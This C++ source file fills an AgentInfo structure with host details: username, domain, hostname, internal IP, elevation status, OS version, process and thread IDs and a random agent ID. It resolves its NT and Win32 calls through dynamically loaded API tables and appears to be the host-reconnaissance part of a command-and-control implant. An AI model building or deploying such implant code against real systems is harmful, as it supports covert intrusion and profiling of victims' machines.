#include "ApiLoader.h"
#include "AgentInfo.h"
#include "utils.h"

AgentInfo::AgentInfo()
{
	SYSTEM_PROCESSOR_INFORMATION SystemInfo = { 0 };
	OSVERSIONINFOEXW OSVersion = { 0 };
	OSVersion.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);

	ApiNt->NtQuerySystemInformation(SystemProcessorInformation, &SystemInfo, sizeof(SYSTEM_PROCESSOR_INFORMATION), 0);
	ApiNt->RtlGetVersion((PRTL_OSVERSIONINFOW) &OSVersion);

	this->AgentId      = GenerateRandom32();
	this->Acp          = ApiWin->GetACP();
	this->Oemcp        = ApiWin->GetOEMCP();
	this->GmtOffest    = GetGmtOffset();
	this->Pid          = (WORD) NtCurrentTeb()->ClientId.UniqueProcess;
	this->Tid          = (WORD)NtCurrentTeb()->ClientId.UniqueThread;
	this->Elevated     = IsElevate();
	this->Arch64       = (sizeof(void*) != 4);
	this->Sys64        = (SystemInfo.ProcessorArchitecture == 9);
	this->BuildNumber  = OSVersion.dwBuildNumber;
	this->MajorVersion = OSVersion.dwMajorVersion;
	this->MinorVersion = OSVersion.dwMinorVersion;
	this->IsServer     = OSVersion.wProductType != VER_NT_WORKSTATION;
	this->InternalIP   = GetInternalIpLong();
	this->Username     = _GetUserName();
	this->Domain       = _GetDomainName();
	this->Hostname     = _GetHostName();
	this->Process      = _GetProcessName();
}

AgentInfo::~AgentInfo()
{
	MemFreeLocal((LPVOID*) &this->Username, StrLenA(this->Username));
	MemFreeLocal((LPVOID*)&this->Domain, StrLenA(this->Domain));
	MemFreeLocal((LPVOID*)&this->Hostname, StrLenA(this->Hostname));
	MemFreeLocal((LPVOID*)&this->Process, StrLenA(this->Process));
}
